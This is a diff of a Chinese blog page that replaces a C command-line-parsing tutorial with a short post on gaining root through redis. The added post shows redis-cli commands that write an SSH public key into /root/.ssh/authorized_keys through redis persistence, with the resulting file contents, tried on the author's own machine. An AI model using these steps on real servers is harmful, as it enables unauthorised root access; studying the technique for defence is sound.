@@ -17,21 +17,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>C 语言处理命令行参数 | 方瑾</title>
+  <title>通过 redis 获取系统的 root 权限 | 方瑾</title>
   <meta name="description" content="&#x2F;* http:&#x2F;&#x2F;prismjs.com&#x2F;download.html?themes&#x3D;prism&amp;languages&#x3D;markup+css+clike+javascript+abap+actionscript+ada+apacheconf+apl+applescript+asciidoc+aspnet">
 <meta property="og:type" content="article">
-<meta property="og:title" content="C 语言处理命令行参数">
-<meta property="og:url" content="http://blog.fangjin.life/util/c-comand/index.html">
+<meta property="og:title" content="通过 redis 获取系统的 root 权限">
+<meta property="og:url" content="http://blog.fangjin.life/redis-penetration/index.html">
 <meta property="og:site_name" content="方瑾的博客">
 <meta property="og:description" content="&#x2F;* http:&#x2F;&#x2F;prismjs.com&#x2F;download.html?themes&#x3D;prism&amp;languages&#x3D;markup+css+clike+javascript+abap+actionscript+ada+apacheconf+apl+applescript+asciidoc+aspnet">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-11-26T08:34:00.000Z">
-<meta property="article:modified_time" content="2021-11-30T09:56:35.174Z">
+<meta property="article:published_time" content="2021-12-01T09:56:00.000Z">
+<meta property="article:modified_time" content="2021-12-01T09:57:44.622Z">
 <meta property="article:author" content="fangjin">
-<meta property="article:tag" content="c">
+<meta property="article:tag" content="redis">
 <meta name="twitter:card" content="summary">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://blog.fangjin.life/util/c-comand/index.html">
+  <link rel="canonical" href="http://blog.fangjin.life/redis-penetration/index.html">
   
     <link rel="alternate" href="/atom.xml" title="方瑾的博客" type="application/atom+xml">
   
@@ -183,7 +183,7 @@
   <div class="">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">文章目录</h3>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%90%E6%A7%BD"><span class="toc-number">1.</span> <span class="toc-text">吐槽</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getopt"><span class="toc-number">2.</span> <span class="toc-text">getopt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getopt_long"><span class="toc-number">3.</span> <span class="toc-text">getopt_long</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5-redis"><span class="toc-number">1.</span> <span class="toc-text">连接 redis</span></a></li></ol>
     </nav>
   </div>
 </aside>
@@ -191,14 +191,14 @@
 
 <main class="main" role="main">
   <div class="content">
-  <article id="post-util/c-comand" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-redis-penetration" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      C 语言处理命令行参数
+      通过 redis 获取系统的 root 权限
     </h1>
   
 
@@ -206,20 +206,20 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/util/c-comand/" class="article-date">
-	  <time datetime="2021-11-26T08:34:00.000Z" itemprop="datePublished">2021-11-26</time>
+	<a href="/redis-penetration/" class="article-date">
+	  <time datetime="2021-12-01T09:56:00.000Z" itemprop="datePublished">2021-12-01</time>
 	</a>
 </span>
         
   <span class="article-category">
     <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/">教程</a>
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a>
   </span>
 
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/c/" rel="tag">c</a>
+	<a class="article-tag-link-link" href="/tags/redis/" rel="tag">redis</a>
   </span>
 
 
@@ -234,16 +234,16 @@
 
 	<span class="article-read hidden-xs">
     	<i class="icon icon-eye-fill" aria-hidden="true"></i>
-    	<span id="/util/c-comand/" class="leancloud_visitors"  data-flag-title="C 语言处理命令行参数">0</span>
+    	<span id="/redis-penetration/" class="leancloud_visitors"  data-flag-title="通过 redis 获取系统的 root 权限">0</span>
     </span>
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/util/c-comand/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/redis-penetration/#comments" class="article-comment-link">评论</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 4.5k(字)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 3.7k(字)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 28(分)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 23(分)</span>
 	
 
       </div>
@@ -473,221 +473,53 @@ pre[data-line] {
   </head>
   <body for="html-export">
     <div class="mume markdown-preview  " >
-    <h3 class="mume-header" id="%E5%90%90%E6%A7%BD">&#x5410;&#x69FD;</h3>
+    <p>&#x65E0;&#x610F;&#x4E2D;&#x5728;&#x770B;&#x5230;&#x4E00;&#x7BC7;&#x5229;&#x7528; redis &#x83B7;&#x53D6; ssh &#x767B;&#x5F55;&#x6743;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x81EA;&#x5DF1;&#x8BD5;&#x9A8C;&#x4E86;&#x4E00;&#x4E0B;&#x3002;</p>
+<h3 class="mume-header" id="%E8%BF%9E%E6%8E%A5-redis">&#x8FDE;&#x63A5; redis</h3>
 
-<p>&#x5F53;&#x7F16;&#x5199;&#x4E00;&#x4E9B;&#x547D;&#x4EE4;&#x884C;&#x7A0B;&#x5E8F;&#x65F6;&#xFF0C;&#x7ECF;&#x5E38;&#x9700;&#x8981;&#x4E3A;&#x7A0B;&#x5E8F;&#x6CE8;&#x5165;&#x82E5;&#x5E72;&#x53C2;&#x6570;&#x3002;&#x5728; C &#x8BED;&#x8A00;&#x4E2D;&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x4F20;&#x53C2;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E3B;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x8868;&#x83B7;&#x53D6;&#xFF1A;</p>
-
-    <div class="code-title">
-      <a name="undefined">code</a>
-      <span>c</span>
-    </div>
-    <pre data-role="codeBlock" data-info="c" class="language-c"><span class="token keyword keyword-int">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> argc<span class="token punctuation">,</span> <span class="token keyword keyword-char">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</pre><p><code>argc</code> &#x662F;&#x53C2;&#x6570;&#x8868;&#x4E2A;&#x6570;&#xFF0C;<code>argv</code> &#x5219;&#x662F;&#x53C2;&#x6570;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6570;&#x7EC4;&#x3002;</p>
-<p>&#x5BF9;&#x4E8E;&#x7B80;&#x5355;&#x7684;&#x7A0B;&#x5E8F;&#x8FD9;&#x5C31;&#x8DB3;&#x591F;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x4F20;&#x53C2;&#x8F83;&#x4E3A;&#x590D;&#x6742;&#xFF0C;&#x4F8B;&#x5982;&#x5E38;&#x7528;&#x7684; ffmpeg &#x622A;&#x53D6;&#x89C6;&#x9891;&#x90E8;&#x5206;&#x751F;&#x6210;gif&#xFF1A;</p>
 
     <div class="code-title">
-      <a name="undefined">code</a>
-      <span>shell</span>
-    </div>
-    <pre data-role="codeBlock" data-info="shell" class="language-shell">ffmpeg -y -ss 00:00:01 -t <span class="token number">6</span> -i .mp4 -vf <span class="token assign-left variable">scale</span><span class="token operator">=</span><span class="token number">700</span>:-1 -f gif -r <span class="token number">25</span> some.gif
-</pre><p>&#x8FD9;&#x6837;&#x7684;&#x53C2;&#x6570;&#x8868;&#x65E0;&#x8BBA;&#x662F;&#x5F00;&#x53D1;&#x8FD8;&#x662F;&#x7EF4;&#x62A4;&#x90FD;&#x8981;&#x6D88;&#x8017;&#x5DE8;&#x5927;&#x7684;&#x7CBE;&#x529B;&#xFF0C;&#x8FD8;&#x597D;&#x6709;&#x4ECA;&#x5929;&#x7684;&#x4E3B;&#x89D2; <code>getopt</code>&#x3002;</p>
-<h3 class="mume-header" id="getopt">getopt</h3>
-
-<p>&#x51FD;&#x6570;&#x539F;&#x578B;&#xFF1A;</p>
-
-    <div class="code-title">
-      <a name="undefined">code</a>
-      <span>c</span>
-    </div>
-    <pre data-role="codeBlock" data-info="c" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h&gt;</span></span>
-
-<span class="token keyword keyword-extern">extern</span> <span class="token keyword keyword-char">char</span><span class="token operator">*</span> optarg
-<span class="token keyword keyword-extern">extern</span> <span class="token keyword keyword-int">int</span> opterr<span class="token punctuation">;</span>
-<span class="token keyword keyword-extern">extern</span> <span class="token keyword keyword-int">int</span> optind<span class="token punctuation">;</span>
-<span class="token keyword keyword-extern">extern</span> <span class="token keyword keyword-int">int</span> optopt<span class="token punctuation">;</span>
-
-<span class="token keyword keyword-int">int</span> <span class="token function">getopt</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> argc<span class="token punctuation">,</span> <span class="token keyword keyword-char">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> <span class="token keyword keyword-const">const</span> <span class="token keyword keyword-char">char</span><span class="token operator">*</span> shortopts<span class="token punctuation">)</span><span class="token punctuation">;</span>
-</pre><p>getopt &#x51FD;&#x6570;&#x7684;&#x524D;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x63A5;&#x53D7;&#x81EA; main &#x51FD;&#x6570;&#x7684;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;<code>shortopts</code> &#x7528;&#x6765;&#x63CF;&#x8FF0;&#x53C2;&#x6570;&#x8868;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x4F8B;&#x5982; <code>abc:d::</code> &#x5BF9;&#x5E94;&#x5230;&#x547D;&#x4EE4;&#x884C;&#x5C31;&#x662F; <code>-a -b -c=xxx -d</code>&#xFF0C;<code>c</code> &#x540E;&#x9762;&#x7D27;&#x8DDF;&#x4E00;&#x4E2A;&#x5192;&#x53F7;&#xFF0C;&#x8868;&#x793A;&#x5FC5;&#x987B;&#x4E3A; <code>c</code> &#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;<code>d</code> &#x540E;&#x9762;&#x6709;&#x4E24;&#x4E2A;&#x8FDE;&#x7EED;&#x7684;&#x5192;&#x53F7;&#xFF0C;&#x8868;&#x793A; <code>d</code> &#x7684;&#x503C;&#x53EF;&#x9009;&#x3002;</p>
-
-    <div class="code-title">
-      <a name="undefined">code</a>
-      <span>c</span>
-    </div>
-    <pre data-role="codeBlock" data-info="c { .line-numbers }" class="language-c line-numbers"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
-
-<span class="token keyword keyword-int">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> argc<span class="token punctuation">,</span> <span class="token keyword keyword-char">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword keyword-char">char</span><span class="token operator">*</span> shortopts <span class="token operator">=</span> <span class="token string">&quot;abc:d::&quot;</span><span class="token punctuation">;</span>
-  <span class="token keyword keyword-char">char</span> key<span class="token punctuation">;</span>
-  <span class="token keyword keyword-while">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> shortopts<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;key[%c] = value[%s]\n&quot;</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre><p>*&#x6CE8;&#xFF1A;&#x53C2;&#x6570; key &#x548C; value &#x4E4B;&#x95F4;&#x7684;&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#xFF0C;<code>-c xxx</code> &#x548C; <code>-cxxx</code> &#x90FD;&#x53EF;&#x4EE5;&#x6B63;&#x786E;&#x8BC6;&#x522B;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x9009;&#x53C2;&#x6570;&#x5982;&#x679C;&#x8BBE;&#x7F6E; value&#xFF0C;&#x5219;&#x5FC5;&#x987B;&#x65F6;&#x5019;&#x540E;&#x8005;&#x5199;&#x6CD5; <code>-dyyy</code></p>
-
-    <div class="code-title">
-      <a name="undefined">code</a>
+      <a name="&#x5165;&#x4FB5;redis">&#x5165;&#x4FB5;redis</a>
       <span>text</span>
     </div>
-    <pre data-role="codeBlock" data-info="text" class="language-text">[root@fangjin test]# make main
-gcc -g -c main.c
-gcc -g -o main main.o
-[root@fangjin test]# ./main -a -b -c xxx -dyyy
-key[a] = value[(null)]
-key[b] = value[(null)]
-key[c] = value[xxx]
-key[d] = value[yyy]
-</pre><p><code>optarg</code> &#x662F;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x5B83;&#x8D1F;&#x8D23;&#x5B58;&#x50A8;&#x5F53;&#x524D;&#x547D;&#x4EE4;&#x884C;&#x4F20;&#x53C2;&#x89E3;&#x6790;&#x5230;&#x7684; value&#x3002;<code>opterr</code> &#x8868;&#x793A;&#x662F;&#x5426;&#x6355;&#x83B7;&#x9519;&#x8BEF;&#x5C06;&#x5176;&#x8F93;&#x5165;&#x5230;&#x6807;&#x51C6;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x4E2D;&#xFF0C;&#x4F8B;&#x5982;&#x5728;&#x4F20;&#x53C2;&#x65F6;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#x53C2;&#x6570; <code>z</code>&#xFF1A;</p>
+    <pre data-role="codeBlock" data-info="text { file=&quot;&#x5165;&#x4FB5;redis&quot; }" class="language-text">[root@fangjin ~]# redis-cli -h 127.0.0.1 -p 6379
+127.0.0.1:6379&gt; set #key &quot;\n\nssh-rsa AAAAB3NzaCxxxxx\n\n&quot;
+OK
+127.0.0.1:6379&gt; config set dir /root/.ssh
+OK
+127.0.0.1:6379&gt; config set dbfilename authorized_keys
+OK
+127.0.0.1:6379&gt; save
+OK
+127.0.0.1:6379&gt;
+</pre><p>&#x5229;&#x7528; redis &#x7684;&#x6301;&#x4E45;&#x5316;&#x5C06;&#x952E;&#x503C;&#x5BF9;&#x7F13;&#x5B58;&#x5230; /root/.ssh/authorized_keys &#x4E2D;&#xFF1A;</p>
 
     <div class="code-title">
-      <a name="undefined">code</a>
+      <a name="authorized_keys &#x88AB;&#x6539;&#x5199;">authorized_keys &#x88AB;&#x6539;&#x5199;</a>
       <span>text</span>
     </div>
-    <pre data-role="codeBlock" data-info="text" class="language-text">[root@fangjin test]# ./main -a -b -c -dyyy -z
-key[a] = value[(null)]
-key[b] = value[777]
-key[c] = value[xxx]
-key[d] = value[yyy]
-./main: invalid option -- &apos;z&apos;
-Unknown option: z
-</pre><p>&#x5982;&#x679C;&#x5728;&#x4EE3;&#x7801;&#x5F00;&#x5934;&#x5C06; <code>opterr</code> &#x8BBE;&#x7F6E;&#x4E3A; <code>0</code>&#xFF0C;&#x5219;&#x4E0D;&#x4F1A;&#x6709;&#x6700;&#x540E;&#x4E24;&#x6761;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x8F93;&#x51FA;&#x3002;</p>
-<p><code>optind</code> &#x7528;&#x6765;&#x8868;&#x793A; <code>argv</code> &#x53C2;&#x6570;&#x8868;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x8BFB;&#x53D6;&#x7684;&#x7D22;&#x5F15;&#x4F4D;&#x7F6E;&#xFF0C;<code>optopt</code> &#x8868;&#x793A;&#x4E0D;&#x518D;&#x6307;&#x5B9A;&#x952E;&#x503C;&#x5BF9;&#x4E4B;&#x5916;&#x7684;&#x5269;&#x4F59;&#x53C2;&#x6570;&#x4E2A;&#x6570;&#x3002;</p>
+    <pre data-role="codeBlock" data-info="text { file=&quot;authorized_keys &#x88AB;&#x6539;&#x5199;&quot; }" class="language-text">[root@e9ea89bbb38e .ssh]# cat /root/.ssh/authorized_keys
+
+
+Raof-preamble&#xFFFD;&#xFFFD;&#xFFFD;#keyver5.0.8&#xFFFD;
+&#xFFFD;edis-bits&#xFFFD;@&#xFFFD;ctime&#xFFFD;YE&#xFFFD;aused-mem&#xFFFD;&#xFFFD;&#xFFFD;
+sh-rsa AAAAB3NzaCxxxxx
+
+&#xFFFD;&#xFFFD;&#xFFFD;&#x534;&#xFFFD;&#xFFFD;rw[root@e9ea89bbb38e .ssh]#
+</pre><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x516C;&#x94A5;&#x660E;&#x6587;&#x5DF2;&#x7ECF;&#x88AB;&#x5199;&#x5165;&#xFF0C;&#x6B64;&#x65F6;&#x76F4;&#x63A5;&#x901A;&#x8FC7; ssh &#x8FDE;&#x63A5;&#x5C31;&#x80FD;&#x62FF;&#x5230; root &#x6743;&#x9650;&#xFF1A;</p>
 
     <div class="code-title">
-      <a name="undefined">code</a>
-      <span>c</span>
-    </div>
-    <pre data-role="codeBlock" data-info="c { .line-numbers .highlight=[21-23] }" class="language-c line-numbers" data-line="21-23"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
-
-<span class="token keyword keyword-int">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> argc<span class="token punctuation">,</span> <span class="token keyword keyword-char">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  opterr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-  <span class="token keyword keyword-char">char</span><span class="token operator">*</span> shortopts <span class="token operator">=</span> <span class="token string">&quot;abc:d::&quot;</span><span class="token punctuation">;</span>
-  <span class="token keyword keyword-char">char</span> key<span class="token punctuation">;</span>
-  <span class="token keyword keyword-while">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> shortopts<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword keyword-switch">switch</span> <span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-      <span class="token keyword keyword-case">case</span> <span class="token string">&apos;a&apos;</span><span class="token operator">:</span>
-      <span class="token keyword keyword-case">case</span> <span class="token string">&apos;b&apos;</span><span class="token operator">:</span>
-      <span class="token keyword keyword-case">case</span> <span class="token string">&apos;c&apos;</span><span class="token operator">:</span>
-      <span class="token keyword keyword-case">case</span> <span class="token string">&apos;d&apos;</span><span class="token operator">:</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;key[%c] = value[%s]\n&quot;</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword keyword-break">break</span><span class="token punctuation">;</span>
-      <span class="token keyword keyword-case">case</span> <span class="token string">&apos;?&apos;</span><span class="token operator">:</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Unknown option: %c\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword keyword-char">char</span><span class="token punctuation">)</span>optopt<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword keyword-break">break</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword keyword-for">for</span> <span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> i <span class="token operator">=</span> optind<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%s\n&quot;</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span><div class="line-highlight-wrapper">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div aria-hidden="true" class="line-highlight" data-range="21-23" data-start="21" data-end="23">
-
-
-</div></div></pre>
-    <div class="code-title">
-      <a name="undefined">code</a>
+      <a name="ssh &#x5165;&#x4FB5;">ssh &#x5165;&#x4FB5;</a>
       <span>text</span>
     </div>
-    <pre data-role="codeBlock" data-info="text" class="language-text">[root@fangjin test]# ./main -a -b -c xxx -dyyy -z 123 456 789
-key[a] = value[(null)]
-key[b] = value[(null)]
-key[c] = value[xxx]
-key[d] = value[yyy]
-Unknown option: z
-123
-456
-789
-</pre><p>&#x501F;&#x52A9; <code>optind</code> &#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x672A;&#x88AB;&#x8868;&#x8FBE;&#x5F0F;&#x6355;&#x83B7;&#x7684;&#x5269;&#x4F59;&#x53C2;&#x6570;&#xFF0C;&#x6B64;&#x5904;&#x6709;&#x4E00;&#x4E2A;&#x5BB9;&#x6613;&#x641E;&#x6DF7;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6CE8;&#x610F;&#x770B;&#x4E0B;&#x9762;&#x7684;&#x4F20;&#x53C2;&#xFF1A;</p>
-
-    <div class="code-title">
-      <a name="undefined">code</a>
-      <span>text</span>
-    </div>
-    <pre data-role="codeBlock" data-info="text" class="language-text">[root@fangjin test]# make main; ./main -a -b 789 -cxxx -dyyy -z 123 456
-make: &apos;main&apos; is up to date.
-key[a] = value[(null)]
-key[b] = value[(null)]
-key[c] = value[xxx]
-key[d] = value[yyy]
-Unknown option: z
-789
-123
-456
-</pre><p>&#x67E5;&#x770B;&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x7684; <code>[21-23]</code> &#x884C;&#xFF0C;<code>789</code> &#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x5E76;&#x6CA1;&#x6709;&#x5728;&#x53C2;&#x6570;&#x8868;&#x7684;&#x6700;&#x540E;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4ECD;&#x53EF;&#x4EE5;&#x88AB; for &#x5FAA;&#x73AF;&#x904D;&#x5386;&#x51FA;&#x6765;&#x5462;&#xFF1F;&#x56E0;&#x4E3A; getopt &#x51FD;&#x6570;&#x5728;&#x6267;&#x884C;&#x65F6;&#xFF0C;&#x4F1A;&#x8C03;&#x6574; args &#x4E2D;&#x53C2;&#x6570;&#x7684;&#x987A;&#x5E8F;&#x3002;</p>
-<h3 class="mume-header" id="getopt_long">getopt_long</h3>
-
-<p>getopt_long &#x4E0E; getopt &#x65E0;&#x592A;&#x5927;&#x5DEE;&#x522B;&#xFF0C;&#x53EA;&#x662F;&#x652F;&#x6301;&#x4E86;&#x957F;&#x9009;&#x9879; <code>--name=zhangsan --age=12</code>&#x3002;</p>
-
-    <div class="code-title">
-      <a name="undefined">code</a>
-      <span>c</span>
-    </div>
-    <pre data-role="codeBlock" data-info="c" class="language-c"><span class="token keyword keyword-int">int</span> <span class="token function">getopt_long</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> argc<span class="token punctuation">,</span> <span class="token keyword keyword-char">char</span> <span class="token operator">*</span> <span class="token keyword keyword-const">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-<span class="token keyword keyword-const">const</span> <span class="token keyword keyword-char">char</span> <span class="token operator">*</span>optstring<span class="token punctuation">,</span>
-<span class="token keyword keyword-const">const</span> <span class="token keyword keyword-struct">struct</span> <span class="token class-name">option</span> <span class="token operator">*</span>longopts<span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span> <span class="token operator">*</span>longindex<span class="token punctuation">)</span><span class="token punctuation">;</span>
-</pre><p>&#x9664;&#x4E86;&#x5728;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x4E0A;&#x53D1;&#x751F;&#x4E86;&#x4E00;&#x70B9;&#x53D8;&#x5316;&#xFF0C;&#x5176;&#x4F59;&#x5B8C;&#x5168;&#x76F8;&#x540C;&#xFF0C;&#x672C;&#x6587;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#xFF1A;</p>
-
-    <div class="code-title">
-      <a name="undefined">code</a>
-      <span>c</span>
-    </div>
-    <pre data-role="codeBlock" data-info="c { .line-numbers }" class="language-c line-numbers"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;getopt.h&gt;</span></span>
-
-<span class="token keyword keyword-int">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> argc<span class="token punctuation">,</span> <span class="token keyword keyword-char">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword keyword-int">int</span> opt_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-  <span class="token keyword keyword-struct">struct</span> <span class="token class-name">option</span> opts<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
-    <span class="token punctuation">{</span> <span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">&apos;m&apos;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
-    <span class="token punctuation">{</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">,</span> required_argument<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">&apos;s&apos;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
-  <span class="token punctuation">}</span><span class="token punctuation">;</span>
-  <span class="token keyword keyword-char">char</span><span class="token operator">*</span> shortopts <span class="token operator">=</span> <span class="token string">&quot;m:s:&quot;</span><span class="token punctuation">;</span>
-  <span class="token keyword keyword-char">char</span> key<span class="token punctuation">;</span>
-  <span class="token keyword keyword-while">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token function">getopt_long</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> shortopts<span class="token punctuation">,</span> opts<span class="token punctuation">,</span> <span class="token operator">&amp;</span>opt_index<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword keyword-switch">switch</span> <span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-      <span class="token keyword keyword-case">case</span> <span class="token string">&apos;m&apos;</span><span class="token operator">:</span>
-      <span class="token keyword keyword-case">case</span> <span class="token string">&apos;s&apos;</span><span class="token operator">:</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;key[%c] = value[%s]\n&quot;</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword keyword-break">break</span><span class="token punctuation">;</span>
-      <span class="token keyword keyword-case">case</span> <span class="token string">&apos;?&apos;</span><span class="token operator">:</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Unknown option: %c\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword keyword-char">char</span><span class="token punctuation">)</span>optopt<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword keyword-break">break</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-  <span class="token punctuation">}</span>
